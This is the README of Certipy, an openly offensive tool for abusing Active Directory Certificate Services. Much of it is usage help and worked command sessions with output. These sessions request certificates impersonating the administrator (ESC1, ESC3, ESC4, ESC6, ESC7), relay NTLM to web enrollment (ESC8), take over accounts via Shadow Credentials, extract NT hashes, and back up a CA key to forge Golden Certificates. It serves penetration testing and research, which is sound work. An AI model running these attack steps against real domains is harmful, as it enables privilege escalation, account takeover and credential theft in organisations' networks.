# Certipy

Certipy is an offensive tool for enumerating and abusing Active Directory Certificate Services (AD CS). If you're not familiar with AD CS and the various domain escalation techniques, I highly recommend reading [Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2) by [Will Schroeder](https://twitter.com/harmj0y) and [Lee Christensen](https://twitter.com/tifkin_).

## Table of Contents

- [Certipy](#certipy)
  - [Table of Contents](#table-of-contents)
  - [Installation](#installation)
  - [Usage](#usage)
    - [Find](#find)
    - [Request](#request)
    - [Authenticate](#authenticate)
    - [Shadow Credentials](#shadow-credentials)
    - [Golden Certificates](#golden-certificates)
    - [Certificates](#certificates)
    - [Domain Escalation](#domain-escalation)
      - [ESC1](#esc1)
      - [ESC2](#esc2)
      - [ESC3](#esc3)
      - [ESC4](#esc4)
      - [ESC6](#esc6)
      - [ESC7](#esc7)
      - [ESC8](#esc8)
  - [Contact](#contact)
  - [Credits](#credits)

## Installation

```bash
python3 setup.py install
```

## Usage

A lot of the usage and features are demonstrated in the [blog post](https://research.ifcr.dk/34d1c26f0dc6) for the new Certipy 2.0 release.

```
Certipy v2.0.8 - by Oliver Lyak (ly4k)

usage: certipy [-v] [-h] {auth,ca,find,forge,relay,req,shadow,template,cert} ...

Active Directory Certificate Services enumeration and abuse

positional arguments:
  {auth,ca,find,forge,relay,req,shadow,template,cert}
                        Action
    auth                Authenticate using certificates
    ca                  Manage CA and certificates
    find                Enumerate AD CS
    forge               Create Golden Certificates
    relay               NTLM Relay to AD CS HTTP Endpoints
    req                 Request certificates
    shadow              Abuse Shadow Credentials for account takeover
    template            Manage certificate templates
    cert                Manage certificates and private keys

optional arguments:
  -v, --version         Show Certipy's version number and exit
  -h, --help            Show this help message and exit
```

### Find

The `find` command is useful for enumerating AD CS certificate templates, certificate authorities and other configurations.

```
Certipy v2.0.8 - by Oliver Lyak (ly4k)

usage: certipy find [-h] [-debug] [-json] [-bloodhound] [-text] [-output prefix] [-enabled] [-scheme ldap scheme] [-dc-ip ip address] [-target-ip ip address] [-ns nameserver] [-dns-tcp] [-timeout seconds] [-hashes LMHASH:NTHASH] [-no-pass] [-k] target

positional arguments:
  target                [[domain/]username[:password]@]<target name or address>

optional arguments:
  -h, --help            show this help message and exit
  -debug                Turn debug output on

output options:
  -json                 Output result as JSON only
  -bloodhound           Output result as BloodHound data only
  -text, -txt           Output result as text only
  -output prefix        Filename prefix for writing results to

find options:
  -enabled              Show only enabled certificate templates

connection options:
  -scheme ldap scheme
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it
  -ns nameserver        Nameserver for DNS resolution
  -dns-tcp              Use TCP instead of UDP for DNS queries
  -timeout seconds      Timeout for connections

authentication options:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              Don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line
```

The output can come in various formats. By default, Certipy will output the enumeration results as text, JSON, and BloodHound data.

```bash
$ certipy find 'corp.local/john:Passw0rd!@dc.corp.local'
Certipy v2.0.8 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 8 enabled certificate templates
[*] Saved text output to '20220218220900_Certipy.txt'
[*] Saved JSON output to '20220218220900_Certipy.json'
[*] Saved BloodHound data to '20220218220900_Certipy.zip'. Drag and drop the file into the BloodHound GUI
```

To only output BloodHound data, you can specify the `-bloodhound` parameter.

```bash
$ certipy find 'corp.local/john:Passw0rd!@dc.corp.local' -bloodhound
Certipy v2.0.8 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 8 enabled certificate templates
[*] Saved BloodHound data to '20220218220909_Certipy.zip'. Drag and drop the file into the BloodHound GUI
```

The BloodHound data is saved as a ZIP-file that can be imported into the latest version of BloodHound. Please note that Certipy uses BloodHound's new format, introduced in version 4.

Custom Certipy queries for BloodHound can be found in [customqueries.json](./customqueries.json).

On Linux, custom BloodHound queries can be added in `~/.config/bloodhound/customqueries.json`, and for Windows in `C:\Users\[USERNAME]\AppData\Roaming\BloodHound\customqueries.json`

### Request

The `req` command is useful for requesting and retrieving certificates.

```
Certipy v2.0.8 - by Oliver Lyak (ly4k)

usage: certipy req [-h] -ca certificate authority name [-debug] [-template template name] [-alt alternative UPN] [-retrieve request ID] [-on-behalf-of domain\account] [-pfx pfx/p12 file name] [-out output file name] [-dynamic-endpoint] [-dc-ip ip address] [-target-ip ip address] [-ns nameserver] [-dns-tcp]
                   [-timeout seconds] [-hashes LMHASH:NTHASH] [-no-pass] [-k]
                   target

positional arguments:
  target                [[domain/]username[:password]@]<target name or address>

optional arguments:
  -h, --help            show this help message and exit
  -ca certificate authority name
  -debug                Turn debug output on

certificate request options:
  -template template name
  -alt alternative UPN
  -retrieve request ID  Retrieve an issued certificate specified by a request ID instead of requesting a new certificate
  -on-behalf-of domain\account
                        Use a Certificate Request Agent certificate to request on behalf of another user
  -pfx pfx/p12 file name
                        Path to Certificate Request Agent certificate

output options:
  -out output file name

connection options:
  -dynamic-endpoint     Prefer dynamic TCP endpoint over named pipe
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it
  -ns nameserver        Nameserver for DNS resolution
  -dns-tcp              Use TCP instead of UDP for DNS queries
  -timeout seconds      Timeout for connections

authentication options:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              Don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line
```

To request a certificate, you must specify the Certificate Authority (CA) and the template to enroll in.

In this example, we request a certificate from the CA `corp-CA` based on the template `User`.

```bash
$ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'User'
Certipy v2.0.8 - by Oliver Lyak (ly4k)

[*] Requesting certificate
[*] Successfully requested certificate
[*] Request ID is 688
[*] Got certificate with UPN 'john@corp.local'
[*] Saved certificate and private key to 'john.pfx'
```

If the request succeeds, the certificate and private key will be saved as a PFX file. The PFX file can then be used for various purposes depending on the certificate's usage. 

### Authenticate

The `auth` command will use the PKINIT Kerberos extension to authenticate with the provided certificate to retrieve a TGT and the NT hash of the user.

```
Certipy v2.0.8 - by Oliver Lyak (ly4k)

usage: certipy auth [-h] -pfx pfx/p12 file name [-no-ccache] [-no-hash] [-debug] [-dc-ip ip address] [-ns nameserver] [-dns-tcp] [-timeout seconds] [-username username] [-domain domain]

optional arguments:
  -h, --help            show this help message and exit
  -pfx pfx/p12 file name
                        Path to certificate
  -no-ccache            Don't save CCache
  -no-hash              Don't request NT hash
  -debug                Turn debug output on

connection options:
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -ns nameserver        Nameserver for DNS resolution
  -dns-tcp              Use TCP instead of UDP for DNS queries
  -timeout seconds      Timeout for connections

authentication options:
  -username username
  -domain domain
```

By default, Certipy will try to extract the username and domain from the certificate (`-pfx`) for authentication.

```bash
$ certipy auth -pfx administrator.pfx
Certipy v2.0.8 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@corp.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got NT hash for 'administrator@corp.local': a87f3a337d73085c45f9416be5787d86
```

The NT hash and the credential cache (TGT) can be used for further authentication with other tools.

If the example above doesn't work in your case, you can specify the required parameters manually, such as the KDC IP, username, and domain.

```bash
$ certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
Certipy v2.0.8 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@corp.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got NT hash for 'administrator@corp.local': a87f3a337d73085c45f9416be5787d86
```

### Shadow Credentials

The `shadow` command is useful for taking over an account when you can write to the `msDS-KeyCredentialLink` attribute of the account. Read more about Shadow Credentials [here](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).

```
Certipy v2.0.8 - by Oliver Lyak (ly4k)

usage: certipy shadow [-h] [-account target account] [-device-id DEVICE_ID] [-debug] [-out output file name] [-scheme ldap scheme] [-dc-ip ip address] [-target-ip ip address] [-ns nameserver] [-dns-tcp] [-timeout seconds] [-hashes LMHASH:NTHASH] [-no-pass] [-k] {list,add,remove,clear,info,auto} target

positional arguments:
  {list,add,remove,clear,info,auto}
                        Key Credentials action
  target                [[domain/]username[:password]@]<target name or address>

optional arguments:
  -h, --help            show this help message and exit
  -account target account
                        Account to target. If omitted, the user specified in the target will be used
  -device-id DEVICE_ID  Device ID of the Key Credential Link
  -debug                Turn debug output on

output options:
  -out output file name

connection options:
  -scheme ldap scheme
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it
  -ns nameserver        Nameserver for DNS resolution
  -dns-tcp              Use TCP instead of UDP for DNS queries
  -timeout seconds      Timeout for connections

authentication options:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              Don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line
```

In short, the Shadow Credentials attack is performed by adding a new "Key Credential" to the target account. The Key Credential can then be used with the PKINIT Kerberos extension for authentication.

Certipy's `shadow` command has an `auto` action, which will add a new Key Credential to the target account, authenticate with the Key Credential to retrieve the NT hash and a TGT for the target, and finally restore the old Key Credential attribute.

```bash
$ certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
Certipy v2.0.8 - by Oliver Lyak (ly4k)

[*] Targeting user 'johnpc$'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '40d662ce-1112-042f-43cc-d14dc981c671'
[*] Adding Key Credential with device ID '40d662ce-1112-042f-43cc-d14dc981c671' to the Key Credentials for 'johnpc$'
[*] Successfully added Key Credential with device ID '40d662ce-1112-042f-43cc-d14dc981c671' to the Key Credentials for 'johnpc$'
[*] Authenticating as 'johnpc$' with the certificate
[*] Using principal: johnpc$@corp.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'johnpc.ccache'
[*] Trying to retrieve NT hash for 'johnpc$'
[*] Restoring the old Key Credentials for 'johnpc$'
[*] Successfully restored the old Key Credentials for 'johnpc$'
[*] NT hash for 'johnpc$': fc525c9683e8fe067095ba2ddc971889
```

This action is useful if you just want the NT hash or TGT for further authentication. It is possibly to manually add, authenticate, and delete the Key Credential, if desired. See the usage or [blog post](https://research.ifcr.dk/34d1c26f0dc6) for more information. 

### Golden Certificates

Golden Certificates are certificates that are manually forged with a compromised CA's certificate and private key, just like Golden Tickets are forged with a compromised `krbtgt` account's NT hash.

```
Certipy v2.0.8 - by Oliver Lyak (ly4k)

usage: certipy forge [-h] -ca-pfx pfx/p12 file name -alt alternative UPN [-template pfx/p12 file name] [-subject subject] [-crl ldap path] [-serial serial number] [-debug] [-out output file name]

optional arguments:
  -h, --help            show this help message and exit
  -ca-pfx pfx/p12 file name
                        Path to CA certificate
  -alt alternative UPN
  -template pfx/p12 file name
                        Path to template certificate
  -subject subject      Subject to include certificate
  -crl ldap path        ldap path to a CRL
  -serial serial number
  -debug                Turn debug output on

output options:
  -out output file name
```

In order to forge a certificate, we need the CA's certificate and private key.

Certipy can automatically retrieve the certificate and private key with the `-backup` parameter. In order to do so, the user must have administrative privileges on the CA server.

```bash
$ certipy ca 'corp.local/administrator@ca.corp.local' -hashes :a87f3a337d73085c45f9416be5787d86 -backup
Certipy v2.0.8 - by Oliver Lyak (ly4k)

[*] Creating new service
[*] Creating backup
[*] Retrieving backup
[*] Got certificate and private key
[*] Saved certificate and private key to 'corp-CA.pfx'
[*] Cleaning up
```

With the CA's certificate and private key, we can for instance forge a certificate for the domain controller `DC$`:

```bash
$ certipy forge -ca-pfx 'corp-CA.pfx' -alt 'DC$@corp.local'
Certipy v2.0.8 - by Oliver Lyak (ly4k)

[*] Saved forged certificate and private key to 'dc.pfx'
```

The forged certificate can then be used for authentication with Certipy's `auth` command. If the KDC returns `KDC_ERR_CLIENT_NOT_TRUSTED`, it means that the forging was not correct. This usually happens because of a missing certificate revocation list (CRL) in the certificate. You can either specify the CRL manually with `-crl`, or you can use a previously issued certificate as a template with the `-template` parameter. Please note that the template will include all non-defined extensions and attributes in the new certificate, such as the subject and serial number. Certipy will not include any extended key usage in the forged certificate, which means the certificate can be used for any purpose.  

### Certificates

The `cert` command is useful for working with PFX's from other tools, such as [Certify](https://github.com/GhostPack/Certify) or [KrbRelay](https://github.com/cube0x0/KrbRelay), which creates encrypted PFXs. 

```
Certipy v2.0.8 - by Oliver Lyak (ly4k)

usage: certipy cert [-h] [-pfx infile] [-password password] [-key infile] [-cert infile] [-export] [-out outfile] [-nocert] [-nokey] [-debug]

optional arguments:
  -h, --help          show this help message and exit
  -pfx infile         Load PFX from file
  -password password  Set import password
  -key infile         Load private key from file
  -cert infile        Load certificate from file
  -export             Output PFX file
  -out outfile        Output filename
  -nocert             Don't output certificate
  -nokey              Don't output private key
  -debug              Turn debug output on
```

Certipy's commands do not support PFXs with passwords. In order to use an encrypted PFX with Certipy, we can recreate the PFX without the password:

```bash
$ certipy cert -pfx encrypted.pfx -password "a387a1a1-5276-4488-9877-4e90da7567a4" -export -out decrypted.pfx
Certipy v2.0.8 - by Oliver Lyak (ly4k)

[*] Writing PFX to 'decrypted.pfx'
```

The `decrypted.pfx` file can then be used with Certipy's commands. 

It is also possible to use the `cert` command to extract the private key and certificate from a PFX file by leaving out the `-export` parameter:

```bash
$ certipy cert -pfx john.pfx
Certipy v2.0.8 - by Oliver Lyak (ly4k)

-----BEGIN CERTIFICATE-----
MIIF1DCCBLygAwIBAgITFwAAA...
-----END CERTIFICATE-----
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BA...
-----END PRIVATE KEY-----
```

If you only want the certificate or the private key, you can specify `-nokey` or `-nocert`, respectively.

```bash
$ certipy cert -pfx john.pfx -nokey                                          
Certipy v2.0.8 - by Oliver Lyak (ly4k)

-----BEGIN CERTIFICATE-----
MIIF1DCCBLygAwIBAgITFwAAA...
-----END CERTIFICATE-----
$ certipy cert -pfx john.pfx -nocert
Certipy v2.0.8 - by Oliver Lyak (ly4k)

-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BA...
-----END PRIVATE KEY-----
```

### Domain Escalation

The following sections describe how to abuse various misconfigurations for domain escalations with Certipy. Certipy supports ESC1, ESC2, ESC3, ESC4, ESC6, ESC7, and ESC8. All escalation techniques are described in depth in [Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2).

#### ESC1

ESC1 is when a certificate template permits Client Authentication and allows the enrollee to supply an arbitrary Subject Alternative Name (SAN).

For ESC1, we can request a certificate based on the vulnerable certificate template and specify an arbitrary SAN with the `-alt` parameter.

```bash
$ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -alt 'administrator@corp.local'
Certipy v2.0.8 - by Oliver Lyak (ly4k)

[*] Requesting certificate
[*] Successfully requested certificate
[*] Request ID is 659
[*] Got certificate with UPN 'administrator@corp.local'
[*] Saved certificate and private key to 'administrator.pfx'
```

#### ESC2

ESC2 is when a certificate template can be used for any purpose. Since the certificate can be used for any purpose, it can be used for the same technique as with ESC3. See below.

#### ESC3

ESC3 is when a certificate template specifies the Certificate Request Agent EKU (Enrollment Agent). This EKU can be used to request certificates on behalf of other users.

First, we must request a certificate based on the vulnerable certificate template ESC3.

```bash
$ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC3'
Certipy v2.0.8 - by Oliver Lyak (ly4k)

[*] Requesting certificate
[*] Successfully requested certificate
[*] Request ID is 665
[*] Got certificate with UPN 'john@corp.local'
[*] Saved certificate and private key to 'john.pfx'
```

We can then use the Certificate Request Agent certificate (`-pfx`) to request a certificate on behalf of other another user by specifying the `-on-behalf-of`. The `-on-behalf-of` parameter value must be in the form of `domain\user`, and not the FQDN of the domain, i.e. `corp` rather than `corp.local`.

```bash
$ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'
Certipy v2.0.8 - by Oliver Lyak (ly4k)

[*] Requesting certificate
[*] Successfully requested certificate
[*] Request ID is 666
[*] Got certificate with UPN 'administrator@corp.local'
[*] Saved certificate and private key to 'administrator.pfx'
```

#### ESC4

ESC4 is when a user has write privileges over a certificate template. This can for instance be abused to overwrite the configuration of the certificate template to make the template vulnerable to ESC1.

By default, Certipy will overwrite the configuration to make it vulnerable to ESC1. 

We can specify the `-save-old` parameter to save the old configuration, which is useful for restoring the configuration afterwards.

```bash
$ certipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -save-old
Certipy v2.0.8 - by Oliver Lyak (ly4k)

[*] Saved old configuration for 'ESC4' to 'ESC4.json'
[*] Updating certificate template 'ESC4'
[*] Successfully updated 'ESC4'
```

The certificate template is now vulnerable to the ESC1 technique.

Therefore, we can now request a certificate based on the ESC4 template and specify an arbitrary SAN with the `-alt` parameter.

```bash
$ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC4' -alt 'administrator@corp.local'
Certipy v2.0.8 - by Oliver Lyak (ly4k)

[*] Requesting certificate
[*] Successfully requested certificate
[*] Request ID is 671
[*] Got certificate with UPN 'administrator@corp.local'
[*] Saved certificate and private key to 'administrator.pfx'
```

If you want to restore the old configuration, you can specify the path to the saved configuration with the `-configuration` parameter.

```bash
$ certipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -configuration ESC4.json
Certipy v2.0.8 - by Oliver Lyak (ly4k)

[*] Updating certificate template 'ESC4'
[*] Successfully updated 'ESC4'
```

#### ESC6

ESC6 is when the CA specifies the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag. This flag allows the enrollee to specify an arbitrary SAN on all certificates despite a certificate template's configuration.

The attack is the same as ESC1, except that you can choose any certificate template that permits client authentication.

```bash
$ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -alt 'administrator@corp.local'
Certipy v2.0.8 - by Oliver Lyak (ly4k)

[*] Requesting certificate
[*] Successfully requested certificate
[*] Request ID is 673
[*] Got certificate with UPN 'administrator@corp.local'
[*] Saved certificate and private key to 'administrator.pfx'
```

#### ESC7

ESC7 is when a user has the `Manage CA` or `Manage Certificates` access right on a CA. There are no public techniques that can abuse the `Manage Certificates` access right for domain privilege escalation, but it can be used it to issue or deny pending certificate requests.

The ["Certified Pre-Owned"](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) whitepaper mentions that this access right can be used to enable the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag to perform the ESC6 attack, but this will not have any effect until the CA service (`CertSvc`) is restarted. When a user has the `Manage CA` access right, the user is also allowed to restart the service. However, it does not mean that the user can restart the service remotely.

Instead, I've found another technique that doesn't require any service restarts or configuration changes.

**Prerequisites**

In order for this technique to work, the user must also have the `Manage Certificates` access right, and the certificate template `SubCA` must be enabled. With the `Manage CA` access right, we can fulfill these prerequisites.

The technique relies on the fact that users with the `Manage CA` *and* `Manage Certificates` access right can issue failed certificate requests. The `SubCA` certificate template is vulnerable to ESC1, but only administrators can enroll in the template. A user can request to enroll in the `SubCA` - which will be denied - but then issued by the manager afterwards.

If you only have the `Manage CA` access right, you can grant yourself the `Manage Certificates` access right by adding your user as a new officer.

```bash
$ certipy ca 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -add-officer 'john'
Certipy v2.0.8 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'john' on 'corp-CA'
```

The `SubCA` template can be enabled on the CA with the `-enable-template` parameter.

```bash
$ certipy ca 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -enable-template 'SubCA'
Certipy v2.0.8 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-CA'
```

By default, the `SubCA` template is enabled.

**Attack**

If we have fulfilled the prerequisites for this attack, we can start by requesting a certificate based on the `SubCA` template.

This request will be denied, but we will save the private key and note down the request ID.

```bash
$ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'SubCA' -alt 'administrator@corp.local'
Certipy v2.0.8 - by Oliver Lyak (ly4k)

[*] Requesting certificate
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 674
Would you like to save the private key? (y/N) y
[*] Saved private key to 674.key
```

With our `Manage CA` and `Manage Certificates`, we can then issue the failed certificate request with the `ca` command and the `-issue-request <request ID>` parameter.

```bash
$ certipy ca 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -issue-request 674
Certipy v2.0.8 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

And finally, we can retrieve the issued certificate with the `req` command and the `-retrieve <request ID>` parameter.

```bash
$ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -retrieve 674
Certipy v2.0.8 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 674
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Loaded private key from '674.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

#### ESC8

ESC8 is when an Enrollment Service has installed and enabled Web Enrollment via HTTP.

To start the relay server, we can run the `relay` command and specify the CA's IP in `-ca`.

By default, Certipy will request a certificate based on the `Machine` or `User` template depending on whether the relayed account name ends with `$`. It is possible to specify another template with the `-template` parameter.

We can then use a technique such as [PetitPotam](https://github.com/ly4k/PetitPotam) to coerce authentication. For domain controllers, we must specify `-template DomainController`.

```bash
$ certipy relay -ca 172.16.19.100
Certipy v2.0.8 - by Oliver Lyak (ly4k)

[*] Targeting http://172.16.19.100/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server
[*] SMBD-Thread-2: Connection from CORP/ADMINISTRATOR@172.16.19.101 controlled, attacking target http://172.16.19.100
[*] Authenticating against http://172.16.19.100 as CORP/ADMINISTRATOR SUCCEED
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'administrator@corp.local'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## Contact

Please submit any bugs, issues, questions, or feature requests under "Issues" or send them to me on Twitter [@ly4k_](https://twitter.com/ly4k_).

## Credits

- [Will Schroeder](https://twitter.com/harmj0y) and [Lee Christensen](https://twitter.com/tifkin_) for [Certified Pre-Owned](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) and [Certify](https://github.com/GhostPack/Certify)
- [Dirk-jan](https://twitter.com/_dirkjan) for [PKINITtools](https://github.com/dirkjanm/PKINITtools)
- [ShutdownRepo](https://github.com/ShutdownRepo) for [PyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [zer1t0](https://github.com/zer1t0) for [certi](https://github.com/zer1t0/certi)
- [Ex Android Dev](https://github.com/ExAndroidDev) and [Tw1sm](https://github.com/Tw1sm) for Impacket's [adcsattack.py](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/ntlmrelayx/attacks/httpattacks/adcsattack.py)
- [SecureAuthCorp](https://github.com/SecureAuthCorp) for [Impacket](https://github.com/SecureAuthCorp/impacket)